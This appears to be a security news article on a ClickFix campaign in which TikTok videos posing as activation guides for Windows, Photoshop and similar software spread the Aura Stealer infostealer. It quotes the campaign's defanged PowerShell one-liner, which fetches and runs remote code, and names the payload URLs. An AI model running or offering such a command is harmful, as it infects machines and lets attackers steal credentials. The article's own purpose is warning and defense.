# TikTok videos continue to push infostealers in ClickFix attacks

![TikTok](https://www.bleepstatic.com/content/hl-images/2022/08/31/TikTok.jpg)

Cybercriminals are using TikTok videos disguised as free activation guides for popular software like Windows, Spotify, and Netflix to spread information-stealing malware.

ISC Handler Xavier Mertens spotted the ongoing campaign, which is largely the same as the one [observed by Trend Micro](https://www.bleepingcomputer.com/news/security/tiktok-videos-now-push-infostealer-malware-in-clickfix-attacks/) in May

The TikTok videos seen by BleepingComputer pretend to offer instructions on how to activate legitimate products like Windows, Microsoft 365, Adobe Premiere, Photoshop, CapCut Pro, and Discord Nitro, as well as made-up services such as Netflix and Spotify Premium.

![](https://www.bleepstatic.com/images/news/security/t/tiktok/infostealers/tiktok-videos.jpg)

**Malicious videos on TikTok pushing infostealers**  
_Source: BleepingComputer.com_

The videos are performing a ClickFix attack, which is a social engineering technique that provides what appears to be legitimate "fixes" or instructions that trick users into executing malicious PowerShell commands or other scripts that infect their computers with malware.

Each video displays a short one-line command and tells viewers to run it as an administrator in PowerShell:

```
iex (irm slmgr[.]win/photoshop)
```

It should be noted that the program name in the URL is different depending on the program that is being impersonated. For example, in the fake Windows activation videos, instead of the URL containing _photoshop_, it would include _windows_.

In this campaign, when the command is executed, PowerShell connects to the remote site slmgr\[.\]win to retrieve and execute another PowerShell script.

This script downloads two executables from Cloudflare pages, with the first executable downloaded from https://file-epq\[.\]pages\[.\]dev/updater.exe \[[VirusTotal](https://www.virustotal.com/gui/file/58b11b4dc81d0b005b7d5ecae0fb6ddb3c31ad0e7a9abf9a7638169c51356fd8)\]. This executable is a variant of the [Aura Stealer](http://AuroStealer) info-stealing malware.

Aura Stealer collects saved credentials from browsers, authentication cookies, cryptocurrency wallets, and credentials from other applications and uploads them to the attackers, giving them access to your accounts.

Mertens says that an additional payload will be downloaded, named source.exe \[[VirusTotal](https://www.virustotal.com/gui/file/db57e4a73d3cb90b53a0b1401cb47c41c1d6704a26983248897edcc13a367011)\], which is used to self-compile code using .NET's built-in Visual C# Compiler (csc.exe). This code is then injected and launched in memory.

The purpose of the additional payload remains unclear.

Users who perform these steps should consider all of their credentials compromised and immediately reset their passwords on all sites they visit.

ClickFix attacks have become very popular over the past year, used to distribute various malware strains in ransomware and cryptocurrency theft campaigns.

As a general rule, users should never copy text from a website and run it in an operating system dialog box, including within the [File Explorer address bar](https://www.bleepingcomputer.com/news/security/filefix-attack-weaponizes-windows-file-explorer-for-stealthy-powershell-commands/), command prompt, PowerShell prompts, macOS terminal, and Linux shells.